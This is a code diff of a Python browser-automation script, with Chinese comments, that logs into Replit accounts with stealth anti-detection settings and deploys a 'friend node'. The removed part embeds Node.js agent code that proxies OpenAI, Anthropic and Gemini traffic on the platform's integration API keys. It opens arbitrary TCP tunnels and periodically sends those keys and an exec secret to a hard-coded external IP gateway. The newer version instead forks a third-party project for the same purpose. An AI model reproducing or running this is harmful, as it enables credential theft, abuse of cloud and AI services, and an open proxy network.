@@ -1,88 +1,102 @@
 #!/usr/bin/env python3
 """
 replit_deploy_agent.py
-完整子节点部署: 登录 Reseek → 创建 Node.js Repl → 写 agent 代码 → 运行 → 返回 URL。
+Fork @skingsbp/gh-cli-install → Deploy → 返回 URL，自动注册为 friend node。
 用法: python3 replit_deploy_agent.py '<json>'
 JSON: {
   "email": "...",
   "password": "...",
-  "outlook_token": "",        // 可选, 用于重发验证邮件后点击链接
+  "outlook_token": "",        // 可选，用于邮箱验证
   "gateway_url": "http://45.205.27.69:8080",
+  "source_project": "https://replit.com/@skingsbp/gh-cli-install",
   "proxy": "socks5://...",    // 可选
-  "headless": true
+  "headless": true,
+  "deploy": true              // 是否执行 Deploy（需付费账号）
 }
 """
-import sys, json, time, re
+import sys, json, re, time
 
 if len(sys.argv) < 2:
     print(json.dumps({"ok": False, "error": "缺少参数"}))
     sys.exit(1)
 
 args = json.loads(sys.argv[1])
-email        = args["email"]
-password     = args["password"]
-outlook_tok  = args.get("outlook_token", "")
-gateway_url  = args.get("gateway_url", "http://45.205.27.69:8080").rstrip("/")
-proxy_str    = args.get("proxy", "")
-headless     = args.get("headless", True)
-
-AGENT_CODE = """
-const http=require("http"),https=require("https"),url=require("url"),net=require("net"),crypto=require("crypto");const sessions=new Map(),TTOKEN=process.env.TUNNEL_TOKEN||"";function chkTok(q){const u=new URL("http://x"+q.url);return !TTOKEN||u.searchParams.get("token")===TTOKEN;}const PORT=parseInt(process.env.PORT||"3000",10);const GW=(process.env.SELF_REGISTER_URL||"GATEWAY_PLACEHOLDER").replace(/\/$/,"");const ME=process.env.MY_GATEWAY_URL||(process.env.REPLIT_DEV_DOMAIN?"https://"+process.env.REPLIT_DEV_DOMAIN:"")|| (process.env.REPLIT_DOMAINS?"https://"+process.env.REPLIT_DOMAINS.split(",")[0].trim():"");const NAME=process.env.NODE_NAME||process.env.REPL_OWNER||"node";const OBASE=process.env.AI_INTEGRATIONS_OPENAI_BASE_URL||"";const OKEY=process.env.AI_INTEGRATIONS_OPENAI_API_KEY||"";const ABASE=process.env.AI_INTEGRATIONS_ANTHROPIC_BASE_URL||"";const AKEY=process.env.AI_INTEGRATIONS_ANTHROPIC_API_KEY||"";const GBASE=process.env.AI_INTEGRATIONS_GEMINI_BASE_URL||"";const GKEY=process.env.AI_INTEGRATIONS_GEMINI_API_KEY||"";const EXEC_SECRET=process.env.EXEC_SECRET||"";const MLIST=[{id:"gpt-4o",object:"model",created:1706745938,owned_by:"system"},{id:"gpt-4o-mini",object:"model",created:1721172717,owned_by:"system"},{id:"gpt-4-turbo",object:"model",created:1712361441,owned_by:"system"},{id:"gpt-3.5-turbo",object:"model",created:1677610602,owned_by:"system"}];function pj(u,b){return new Promise((res,rej)=>{const p=new url.URL(u),lib=p.protocol==="https:"?https:http,opts={hostname:p.hostname,port:p.port||(p.protocol==="https:"?443:80),path:p.pathname+p.search,method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(b)}};const req=lib.request(opts,r=>{let d="";r.on("data",c=>d+=c);r.on("end",()=>res(d))});req.on("error",rej);req.write(b);req.end();});}function pipe(q,s,base,key,pfx){let t=q.url;if(pfx)t=t.replace(pfx,"");const p=new url.URL(base.replace(/\/$/,"")+t),lib=p.protocol==="https:"?https:http;let body="";q.on("data",c=>body+=c);q.on("end",()=>{const h={...q.headers,authorization:"Bearer "+key,host:p.hostname};delete h["content-length"];const req=lib.request({hostname:p.hostname,port:p.port||(p.protocol==="https:"?443:80),path:p.pathname+p.search,method:q.method,headers:{...h,"content-length":Buffer.byteLength(body)}},r=>{s.writeHead(r.statusCode,r.headers);r.pipe(s)});req.on("error",()=>{s.writeHead(502);s.end('{"error":"bad gateway"}')});if(body)req.write(body);req.end();});}async function hb(){if(!ME||!GW)return;try{await pj(GW+"/api/gateway/self-register",JSON.stringify({gatewayUrl:ME,name:NAME,execSecret:EXEC_SECRET,openaiBaseUrl:OBASE,openaiApiKey:OKEY,anthropicBaseUrl:ABASE,anthropicApiKey:AKEY,geminiBaseUrl:GBASE,geminiApiKey:GKEY}));}catch(_){}}http.createServer((q,s)=>{const path=q.url.split("?")[0];s.setHeader("Content-Type","application/json");if(path==="/"||path==="/health"){s.writeHead(200);s.end(JSON.stringify({status:"ok",ts:Date.now()}));return;}if(path==="/v1/models"&&q.method==="GET"){if(OBASE&&OKEY)return pipe(q,s,OBASE,OKEY,"");s.writeHead(200);s.end(JSON.stringify({object:"list",data:MLIST}));return;}if(q.url.startsWith("/v1/")){if(OBASE&&OKEY)return pipe(q,s,OBASE,OKEY,"");s.writeHead(503);s.end('{"error":"service unavailable"}');return;}if(q.url.startsWith("/anthropic/")){if(ABASE&&AKEY)return pipe(q,s,ABASE,AKEY,"/anthropic");s.writeHead(503);s.end('{"error":"service unavailable"}');return;}if(q.url.startsWith("/gemini/")){if(GBASE&&GKEY)return pipe(q,s,GBASE,GKEY,"/gemini");s.writeHead(503);s.end('{"error":"service unavailable"}');return;}if(q.url.startsWith("/api/tunnel/")){if(!chkTok(q)){s.writeHead(403);s.end('{"error":"forbidden"}');return;}const u=new URL("http://x"+q.url),ps=q.url.split("/");if(q.method==="POST"&&ps[3]==="open"){const h=u.searchParams.get("host"),p=parseInt(u.searchParams.get("port")||"80");const id=crypto.randomBytes(4).toString("hex");const sk=net.createConnection({host:h,port:p},()=>{sessions.set(id,{sk,rb:[],rw:[],cl:false});sk.on("data",d=>{const ss=sessions.get(id);if(!ss)return;ss.rw.length?ss.rw.shift()(d):ss.rb.push(d);});sk.on("close",()=>{const ss=sessions.get(id);if(ss){ss.cl=true;ss.rw.forEach(r=>r(null));}});sk.on("error",()=>{const ss=sessions.get(id);if(ss){ss.cl=true;ss.rw.forEach(r=>r(null));}});s.writeHead(200);s.end(JSON.stringify({ok:true,id}));});sk.on("error",e=>{s.writeHead(502);s.end(JSON.stringify({error:e.message}));});setTimeout(()=>{if(!sessions.has(id))sk.destroy();},10000);return;}if(q.method==="GET"&&ps[3]==="read"){const id=ps[4],ss=sessions.get(id);if(!ss){s.writeHead(404);s.end('{"error":"no session"}');return;}s.writeHead(200,{"Transfer-Encoding":"chunked","Content-Type":"application/octet-stream"});(async()=>{while(true){if(ss.rb.length){const d=Buffer.concat(ss.rb.splice(0));s.write(d.length.toString(16)+"
-");s.write(d);s.write("
-");}else if(ss.cl){s.write("0
-
-");s.end();return;}else{const d=await new Promise(r=>ss.rw.push(r));if(!d){s.write("0
-
-");s.end();return;}s.write(d.length.toString(16)+"
-");s.write(d);s.write("
-");}}})();return;}if(q.method==="POST"&&ps[3]==="write"){const id=ps[4],ss=sessions.get(id);if(!ss){s.writeHead(404);s.end('{"error":"no session"}');return;}let b=Buffer.alloc(0);q.on("data",d=>b=Buffer.concat([b,d]));q.on("end",()=>{ss.sk.write(b);s.writeHead(200);s.end('{"ok":true}');});return;}{const id=ps[4],ss=sessions.get(id);if(ss){ss.sk.destroy();sessions.delete(id);}}s.writeHead(200);s.end('{"ok":true}');return;}s.writeHead(404);s.end('{"error":"not found"}');}).listen(PORT,"0.0.0.0",()=>{hb();setInterval(hb,5*60*1000);});
-""".replace("GATEWAY_PLACEHOLDER", gateway_url).strip()
+email          = args["email"]
+password       = args["password"]
+outlook_tok    = args.get("outlook_token", "")
+gateway_url    = args.get("gateway_url", "http://45.205.27.69:8080").rstrip("/")
+proxy_str      = args.get("proxy", "")
+headless       = args.get("headless", True)
+source_project = args.get("source_project", "https://replit.com/@skingsbp/gh-cli-install")
+do_deploy      = args.get("deploy", True)
 
 def log(msg):
     print(f"[deploy] {msg}", flush=True)
 
 try:
-    from patchright.sync_api import sync_playwright
+    from playwright.sync_api import sync_playwright
 
-    proxy_cfg = {"server": proxy_str} if proxy_str else None
-    launch_args = ["--no-sandbox","--disable-dev-shm-usage","--disable-gpu",
-                   "--disable-extensions","--mute-audio"]
+    pw_proxy = None
+    if proxy_str:
+        pw_proxy = {"server": proxy_str}
 
-    with sync_playwright() as p:
-        browser = p.chromium.launch(headless=headless, args=launch_args,
-                                    proxy=proxy_cfg if proxy_cfg else None)
+    with sync_playwright() as pw:
+        browser = pw.chromium.launch(
+            headless=headless,
+            proxy=pw_proxy,
+            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
+                  "--disable-blink-features=AutomationControlled"],
+        )
         ctx = browser.new_context(
-            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            user_agent=(
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                "AppleWebKit/537.36 (KHTML, like Gecko) "
+                "Chrome/131.0.0.0 Safari/537.36"
+            ),
             viewport={"width": 1280, "height": 800},
         )
+        try:
+            from playwright_stealth import Stealth
+            Stealth().apply_stealth_sync(ctx.new_page())
+        except Exception:
+            pass
+
         page = ctx.new_page()
-        page.set_default_timeout(30000)
+        page.set_default_timeout(60000)
 
-        # ── 1. 登录 ────────────────────────────────────────────────────────────
-        log("打开登录页...")
+        # ── 1. 登录 ─────────────────────────────────────────────────────────────
+        log("导航到登录页...")
         page.goto("https://replit.com/login", wait_until="domcontentloaded")
-        page.wait_for_timeout(3000)
+        page.wait_for_timeout(2000)
 
-        # 填邮箱
-        email_sel = 'input[name="username"], input[type="email"], input[placeholder*="email" i], input[placeholder*="username" i]'
-        try:
-            page.locator(email_sel).first.fill(email, timeout=8000)
-        except:
-            page.keyboard.type(email)
+        log(f"填写邮箱: {email}")
+        for sel in ['input[name="username"]', 'input[placeholder*="email" i]',
+                    'input[type="email"]', '#username']:
+            try:
+                el = page.locator(sel).first
+                if el.is_visible(timeout=3000):
+                    el.fill(email)
+                    break
+            except Exception:
+                pass
 
-        # 填密码
-        try:
-            page.locator('input[type="password"]').first.fill(password, timeout=8000)
-        except:
-            log("未找到密码框")
+        for sel in ['input[name="password"]', 'input[type="password"]', '#password']:
+            try:
+                el = page.locator(sel).first
+                if el.is_visible(timeout=3000):
+                    el.fill(password)
+                    break
+            except Exception:
+                pass
 
-        # 提交
         try:
-            page.locator('button[type="submit"], button:has-text("Log in"), button:has-text("Sign in")').first.click(timeout=5000)
-        except:
+            page.locator(
+                'button[type="submit"], button:has-text("Log in"), button:has-text("Sign in")'
+            ).first.click(timeout=5000)
+        except Exception:
             page.keyboard.press("Enter")
 
-        log("等待登录...")
+        log("等待登录完成...")
         page.wait_for_timeout(8000)
         cur_url = page.url
         log(f"当前URL: {cur_url[:80]}")
@@ -93,18 +107,21 @@ try:
             print(json.dumps({"ok": False, "error": "登录失败"}))
             sys.exit(0)
 
-        # ── 2. 处理邮箱未验证提示 ──────────────────────────────────────────────
+        # ── 2. 邮箱未验证处理 ────────────────────────────────────────────────────
         page.wait_for_timeout(2000)
         try:
-            verify_notice = page.locator('text=/verify your email/i, text=/confirm your email/i, [data-testid="email-verification"]').first
+            verify_notice = page.locator(
+                'text=/verify your email/i, text=/confirm your email/i, '
+                '[data-testid="email-verification"]'
+            ).first
             if verify_notice.is_visible(timeout=3000):
                 log("检测到邮箱未验证提示，尝试重发验证邮件...")
-                resend_btn = page.locator('button:has-text("Resend"), a:has-text("Resend"), button:has-text("Send again")').first
+                resend_btn = page.locator(
+                    'button:has-text("Resend"), a:has-text("Resend"), button:has-text("Send again")'
+                ).first
                 if resend_btn.is_visible(timeout=3000):
                     resend_btn.click()
-                    log("已点击重发验证邮件")
                     page.wait_for_timeout(5000)
-                    # 如果有 outlook_token，尝试点击验证链接
                     if outlook_tok:
                         import subprocess, os
                         script = os.path.join(os.path.dirname(__file__), "click_verify_link.py")
@@ -117,148 +134,118 @@ try:
                         page.wait_for_timeout(5000)
                         page.reload()
                         page.wait_for_timeout(3000)
-        except:
-            pass  # 没有未验证提示
-
-        # ── 3. 创建新 Repl ─────────────────────────────────────────────────────
-        log("导航到创建 Repl 页面...")
-        page.goto("https://replit.com/new", wait_until="domcontentloaded")
-        page.wait_for_timeout(3000)
-
-        # 搜索/选择 Node.js 模板
-        try:
-            search = page.locator('input[placeholder*="search" i], input[placeholder*="template" i], input[type="search"]').first
-            if search.is_visible(timeout=5000):
-                search.fill("Node.js")
-                page.wait_for_timeout(1500)
-        except:
+        except Exception:
             pass
 
-        try:
-            nodejs_opt = page.locator('[data-testid*="nodejs" i], [title*="Node.js"], div:has-text("Node.js"):visible').first
-            if nodejs_opt.is_visible(timeout=5000):
-                nodejs_opt.click()
-                log("选择 Node.js 模板")
-        except:
-            # 尝试直接导航到 Node.js 模板
-            log("模板选择失败，尝试直接导航...")
-            page.goto("https://replit.com/new/nodejs", wait_until="domcontentloaded")
-            page.wait_for_timeout(3000)
+        # ── 3. Fork 源项目 ───────────────────────────────────────────────────────
+        log(f"导航到源项目: {source_project}")
+        page.goto(source_project, wait_until="domcontentloaded")
+        page.wait_for_timeout(4000)
 
-        # 等待编辑器加载
-        log("等待 Repl 编辑器加载...")
-        for _ in range(20):
+        fork_clicked = False
+
+        # 方式 A: 找并点击 Fork / Remix 按钮
+        for fork_sel in [
+            'button:has-text("Fork")',
+            'button:has-text("Remix")',
+            '[data-cy="fork-btn"]',
+            '[data-testid="fork-btn"]',
+            'a:has-text("Fork")',
+            'a:has-text("Remix")',
+        ]:
+            try:
+                btn = page.locator(fork_sel).first
+                if btn.is_visible(timeout=4000):
+                    btn.click()
+                    fork_clicked = True
+                    log(f"Fork 按钮已点击 ({fork_sel})")
+                    break
+            except Exception:
+                pass
+
+        # 方式 B: 直接访问 /fork URL
+        if not fork_clicked:
+            log("按钮未找到，尝试 /fork 端点...")
+            page.goto(source_project.rstrip("/") + "/fork", wait_until="domcontentloaded")
+            page.wait_for_timeout(3000)
+            fork_clicked = True
+
+        # 确认 Fork 弹窗（如有）
+        for confirm_sel in [
+            'button:has-text("Fork it")',
+            'button:has-text("Confirm")',
+            'button:has-text("Create Fork")',
+            'button:has-text("Fork")',
+        ]:
+            try:
+                btn = page.locator(confirm_sel).first
+                if btn.is_visible(timeout=5000):
+                    btn.click()
+                    log(f"确认 Fork 弹窗: {confirm_sel}")
+                    page.wait_for_timeout(2000)
+                    break
+            except Exception:
+                pass
+
+        # 等待跳转到新 fork 的 URL（不包含 skingsbp 的路径）
+        log("等待 fork 完成（最多 60s）...")
+        fork_done = False
+        for i in range(30):
             page.wait_for_timeout(2000)
             cur = page.url
-            if "/repl/" in cur or "@" in cur:
-                log(f"编辑器已加载: {cur[:80]}")
+            log(f"  [{i}] URL={cur[:80]}")
+            if "@" in cur and "/repl/" not in cur:
+                # 已经跳转到 @username/repl-name 页面
+                fork_done = True
                 break
-            log(f"  等待编辑器... URL={cur[:60]}")
-        else:
-            log("编辑器加载超时")
-            # 尝试通过已创建的 repl url
-            pass
+            if "/repl/" in cur or (".replit" in cur and "new" not in cur):
+                fork_done = True
+                break
 
         repl_url = page.url
-        log(f"Repl URL: {repl_url[:100]}")
+        log(f"Fork 完成: {repl_url[:100]}")
 
-        # ── 4. 写入 agent 代码 ─────────────────────────────────────────────────
-        log("写入 agent 代码到 index.js...")
+        # 提取用户名
+        username = ""
+        try:
+            username = (
+                page.evaluate(
+                    "() => window.__REPLIT_NEXT_DATA__?.user?.username "
+                    "|| window.__USER__?.username || ''"
+                )
+                or ""
+            )
+        except Exception:
+            pass
+        if not username:
+            m = re.search(r"replit\.com/@([^/?#]+)", repl_url)
+            if m:
+                username = m.group(1)
+        log(f"账号用户名: {username}")
 
-        # 在文件树中找到/点击 index.js
-        written = False
-        for file_sel in ['[data-cy="file-row"]:has-text("index.js")',
-                         'li:has-text("index.js")',
-                         '.file-row:has-text("index.js")',
-                         '[data-testid="file-row"]:has-text("index.js")']:
-            try:
-                el = page.locator(file_sel).first
-                if el.is_visible(timeout=3000):
-                    el.click()
-                    page.wait_for_timeout(1000)
-                    break
-            except:
-                pass
+        # ── 4. 获取 webview URL（fork 后自动运行，不需要手动 Run）───────────────
+        webview_url = ""
+        try:
+            webview_url = (
+                page.locator(
+                    'iframe[src*="repl.co"], iframe[src*="replit.dev"]'
+                ).first.get_attribute("src") or ""
+            )
+        except Exception:
+            pass
+        if not webview_url and username:
+            # 从项目 URL 推导 slug
+            m = re.search(r"@[^/]+/([^/?#]+)", repl_url)
+            slug = m.group(1) if m else "gh-cli-install"
+            webview_url = f"https://{slug}--{username}.replit.dev"
+        log(f"Webview URL: {webview_url}")
 
-        # 选中编辑器中所有内容并替换
-        for editor_sel in ['.cm-content', '.CodeMirror-code', '[data-cy="editor"] .CodeMirror',
-                           '.monaco-editor .view-lines', '[role="textbox"]']:
-            try:
-                editor = page.locator(editor_sel).first
-                if editor.is_visible(timeout=3000):
-                    editor.click()
-                    page.wait_for_timeout(500)
-                    # 全选
-                    page.keyboard.press("Control+a")
-                    page.wait_for_timeout(300)
-                    # 删除
-                    page.keyboard.press("Delete")
-                    page.wait_for_timeout(300)
-                    # 粘贴代码
-                    ctx.set_content = None  # reset
-                    # FIX: fill() on contenteditable replaces deprecated execCommand
-                    try:
-                        editor.fill(AGENT_CODE, timeout=10000)
-                    except Exception:
-                        editor.click()
-                        page.keyboard.press("Control+a")
-                        page.wait_for_timeout(200)
-                        page.keyboard.press("Delete")
-                        page.wait_for_timeout(200)
-                        page.keyboard.type(AGENT_CODE, delay=0)
-                    page.wait_for_timeout(1000)
-                    written = True
-                    log(f"代码已写入 (via {editor_sel})")
-                    break
-            except:
-                pass
-
-        if not written:
-            # 尝试 keyboard paste
-            log("尝试键盘粘贴...")
-            try:
-                page.keyboard.press("Control+a")
-                page.wait_for_timeout(200)
-                page.keyboard.type(AGENT_CODE, delay=0)
-                written = True
-            except:
-                pass
-
-        # 保存
-        page.keyboard.press("Control+s")
-        page.wait_for_timeout(1000)
-
-        # ── 5. 运行 Repl ───────────────────────────────────────────────────────
-        log("点击运行...")
-        run_btns = [
-            'button[data-cy="run-btn"]',
-            'button:has-text("Run")',
-            '[data-testid="run-btn"]',
-            '#run-btn',
-            '.run-button',
-        ]
-        run_clicked = False
-        for sel in run_btns:
-            try:
-                btn = page.locator(sel).first
-                if btn.is_visible(timeout=3000):
-                    btn.click()
-                    run_clicked = True
-                    log(f"Run 按钮已点击 ({sel})")
-                    break
-            except:
-                pass
-
-        if not run_clicked:
-            log("未找到 Run 按钮")
-
-        page.wait_for_timeout(8000)
-
-        # ── 5b. 自动 Publish（可选，需付费账号）─────────────────────────────────
+        # ── 5. 自动 Deploy（需付费账号）─────────────────────────────────────────
         deployed_url = ""
-        if args.get("deploy", False):
+        if do_deploy:
             log("尝试自动 Deploy...")
             page.wait_for_timeout(5000)
+
             deploy_btns = [
                 'button:has-text("Deploy")',
                 'button:has-text("Publish")',
@@ -270,17 +257,17 @@ try:
             for sel in deploy_btns:
                 try:
                     btn = page.locator(sel).first
-                    if btn.is_visible(timeout=3000):
+                    if btn.is_visible(timeout=4000):
                         btn.click()
                         log(f"Deploy 按钮已点击 ({sel})")
                         deploy_clicked = True
                         page.wait_for_timeout(3000)
                         break
-                except:
+                except Exception:
                     pass
 
             if deploy_clicked:
-                # 确认弹窗 / wizard 下一步
+                # 确认/向导
                 for confirm_sel in [
                     'button:has-text("Confirm")',
                     'button:has-text("Deploy now")',
@@ -289,67 +276,44 @@ try:
                 ]:
                     try:
                         btn = page.locator(confirm_sel).first
-                        if btn.is_visible(timeout=5000):
+                        if btn.is_visible(timeout=6000):
                             btn.click()
                             log(f"确认部署: {confirm_sel}")
                             page.wait_for_timeout(8000)
                             break
-                    except:
+                    except Exception:
                         pass
 
-                # 抓取部署后的 .replit.app URL
+                # 检测 "nothing to publish" 错误
                 try:
-                    # 方式1: 等待成功提示中的链接
-                    link_el = page.locator('a[href*=".replit.app"], a[href*="repl.co"]').first
-                    if link_el.is_visible(timeout=15000):
+                    ntpub = page.locator(
+                        'text=/nothing to publish/i, text=/no deployable/i'
+                    ).first
+                    if ntpub.is_visible(timeout=5000):
+                        log("WARN: 检测到 'nothing to publish' — artifact.toml 可能未同步")
+                        # 这不应发生（fork 已含 kind=web），记录页面内容用于调试
+                        log(f"页面摘要: {page.content()[:300]}")
+                except Exception:
+                    pass
+
+                # 抓取 .replit.app URL
+                try:
+                    link_el = page.locator('a[href*=".replit.app"]').first
+                    if link_el.is_visible(timeout=20000):
                         deployed_url = link_el.get_attribute("href") or ""
                         log(f"部署完成: {deployed_url}")
-                except:
+                except Exception:
                     pass
 
                 if not deployed_url:
-                    # 方式2: 通过内部 GraphQL 获取 deployment URL
-                    try:
-                        token = page.evaluate("""() => {
-                            const m = document.cookie.match(/connect\.sid=([^;]+)/);
-                            return m ? m[1] : '';
-                        }""")
-                        if token:
-                            deployed_url = f"[pending_graphql_check]"
-                    except:
-                        pass
+                    # 从 URL 推导已部署地址
+                    m2 = re.search(r"@([^/]+)/([^/?#]+)", repl_url)
+                    if m2:
+                        u2, slug2 = m2.group(1), m2.group(2)
+                        deployed_url = f"https://{slug2}--{u2}.replit.app"
+                        log(f"推导部署URL: {deployed_url}")
             else:
-                log("未找到 Deploy 按钮（账号可能不支持部署）")
-
-
-        # ── 6. 获取 webview URL ────────────────────────────────────────────────
-        webview_url = ""
-        # 方式1: 从 webview iframe src
-        try:
-            iframe = page.frame_locator('iframe[src*="repl.co"], iframe[src*="replit.dev"]').first
-            webview_url = page.locator('iframe[src*="repl.co"], iframe[src*="replit.dev"]').first.get_attribute("src") or ""
-        except:
-            pass
-
-        # 方式2: 从 URL 推导
-        if not webview_url and repl_url:
-            m = re.search(r'@([^/]+)/([^/?#]+)', repl_url)
-            if m:
-                uname, rname = m.group(1), m.group(2)
-                webview_url = f"https://{rname}--{uname}.replit.dev"
-
-        log(f"Webview URL: {webview_url}")
-
-        # ── 7. 从页面内抓取用户名 ──────────────────────────────────────────────
-        username = ""
-        try:
-            username = page.evaluate("() => window.__REPLIT_NEXT_DATA__?.user?.username || window.__USER__?.username || ''") or ""
-        except:
-            pass
-        if not username:
-            m = re.search(r'replit\.com/@([^/]+)', repl_url)
-            if m:
-                username = m.group(1)
+                log("未找到 Deploy 按钮（账号可能不支持部署，或页面结构变化）")
 
         browser.close()
 
@@ -357,15 +321,13 @@ try:
         "ok": True,
         "repl_url": repl_url,
         "webview_url": webview_url,
-        "written": written,
-        "run_clicked": run_clicked,
         "deployed_url": deployed_url,
-        "email": email,
         "username": username,
+        "forked_from": source_project,
     }
     log(f"完成: {json.dumps(result)}")
     print(json.dumps(result))
 
 except Exception as e:
     import traceback
-    print(json.dumps({"ok": False, "error": str(e), "trace": traceback.format_exc()[-500:]}))
+    print(json.dumps({"ok": False, "error": str(e), "trace": traceback.format_exc()[-800:]}))
